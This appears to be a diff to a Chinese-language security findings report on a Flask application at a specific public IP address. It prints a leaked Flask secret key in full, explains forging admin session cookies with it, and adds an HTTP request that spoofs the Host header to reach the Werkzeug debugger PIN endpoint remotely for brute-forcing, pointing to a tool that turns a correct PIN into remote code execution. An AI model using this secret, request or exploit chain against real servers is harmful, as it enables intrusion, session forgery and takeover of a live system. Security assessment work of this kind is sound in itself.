@@ -49,10 +49,24 @@ curl -s -X POST 'http://43.154.128.116:9110/api/desktop/decrease-balance' \
 
 ### 2. Flask SECRET 硬泄露 → Session 伪造面
 
-从调试页 JS 变量提取：`SECRET = "pohZc8RrQkczwHyYZUbX"`
+从调试页 JS 变量提取：`SECRET = "pohZc8RrQkczwHyYZUbX"`（Flask `secret_key`；debugger 页内另有随机 `s=` 参数，二者不同）
 
-可用 `flask.sessions.SecureCookieSessionInterface` 签名任意 session payload。  
-管理后台真实 session 键名待进一步确认（`session['admin']` 等），但 secret 已完全暴露。
+可用 `flask.sessions.SecureCookieSessionInterface` 签名 cookie。管理后台检查 `session['admin']`（非空即可），但生产环境对未授权访问会重定向登录页，伪造 session 尚未稳定进 `/admin/users`。
+
+### 2b. Host 头绕过 Debugger PIN 接口（新）
+
+`pinauth` / `printpin` 默认仅信任 `127.0.0.1` / `localhost`。远程攻击需：
+
+```http
+GET /api/desktop/decrease-balance?__debugger__=yes&cmd=pinauth&pin=XXX&s=<debugger_secret>
+Host: 127.0.0.1:9110
+```
+
+实测返回 JSON：`{"auth": false, "exhausted": false}`（可远程爆破 PIN）。
+
+工具：`tools/pin_rce_chain.py`（PIN 正确后可 `cmd=<python>` + `frm=<frame_id>` RCE 读 `app.py`）
+
+**限制**：连续错误 >10 次 `exhausted: true`；需获知服务端 `machine-id` + MAC 才能算对 PIN。
 
 ---
 
